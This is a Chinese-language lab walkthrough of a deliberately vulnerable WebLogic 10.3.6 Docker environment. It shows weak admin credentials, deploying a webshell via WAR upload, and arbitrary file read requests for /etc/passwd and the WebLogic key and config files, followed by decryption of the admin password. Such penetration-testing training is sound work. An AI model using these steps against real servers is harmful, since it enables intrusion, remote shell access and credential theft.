# Weblogic 弱口令+前台任意文件读取

## 环境搭建

本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。

Weblogic版本：10.3.6(11g)

Java版本：1.6

启动本环境：

```
docker-compose up -d
```

## 弱口令

环境启动后，访问`http://your-ip:7001/console`，即为weblogic后台。

本环境存在弱口令：

- weblogic
- Oracle@123

weblogic常用弱口令： http://cirt.net/passwords?criteria=weblogic

## 后台上传webshell

获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327153205946.png)

点击安装，选择“上载文件”：

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327153229033.png)

Welogic 的应用目录在 war 包中 `WEB-INF/weblogic.xm`l 里指定（若 `/hello` 已经被使用，要在当前环境下部署 shell，需要修改这个目录，比如修改成`/test）：

```
<?xml version="1.0" encoding="UTF-8"?>
<weblogic-web-app xmlns="http://www.bea.com/ns/weblogic/weblogic-web-app" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.bea.com/ns/weblogic/weblogic-web-app http://www.bea.com/ns/weblogic/weblogic-web-app/1.0/weblogic-web-app.xsd">
<context-root>/test</context-root>
</weblogic-web-app>
```

我们还是以 `/hello` 为例，制作 war 包，将以下文件打包为 `hello.zip`，再重命名为 `hello.war`。

war 包结构如下：

```
D:.
│   file.jsp
│   index.jsp
│   ueditor.jsp //your webshell
│
├───META-INF
│       MANIFEST.MF
│
└───WEB-INF
    │   web.xml
    │   weblogic.xml
    │
    └───classes
```

上传war包，成功后点下一步，填写应用名称：

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327153324801.png)

继续一直下一步，部署完成后，即可获取webshell：

```
http://<YOUR_IP>/hello/ueditor.jsp
```

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327153637353.png)

## 任意文件读取

在刚才部署的 `/hello` 中，模拟了一个任意文件下载漏洞，访问 `http://your-ip:7001/hello/file.jsp?path=/etc/passwd` 可以成功读取passwd文件。那么，该漏洞如何利用？

### 读取后台用户密文与密钥文件

weblogic 密码使用 AES（老版本 3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于 base_domain 下，名为`SerializedSystemIni.dat`和`config.xml`，在本环境中为`./security/SerializedSystemIni.dat`和`./config/config.xml`（基于当前目录`/root/Oracle/Middleware/user_projects/domains/base_domain`）。

`SerializedSystemIni.dat`是一个二进制文件，所以一定要用 burpsuite 来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键 copy to file 就可以保存成一个文件：

```
GET /hello/file.jsp?path=security/SerializedSystemIni.dat HTTP/1.1
```

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327154105568.png)

`config.xml`是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的`<node-manager-password-encrypted>`的值，即为加密后的管理员密码，不要找错了：

```
GET /hello/file.jsp?path=./config/config.xml HTTP/1.1
```

```
<node-manager-password-encrypted>{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=</node-manager-password-encrypted>
```

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327154329532.png)

### 解密密文

然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文（或者参考这篇文章：http://cb.drops.wiki/drops/tips-349.html ，自己编译一个解密的工具）：

![](images/Weblogic%20弱口令+前台任意文件读取/image-20240327154826127.png)

可见，解密后和预设的密码一致，说明成功。
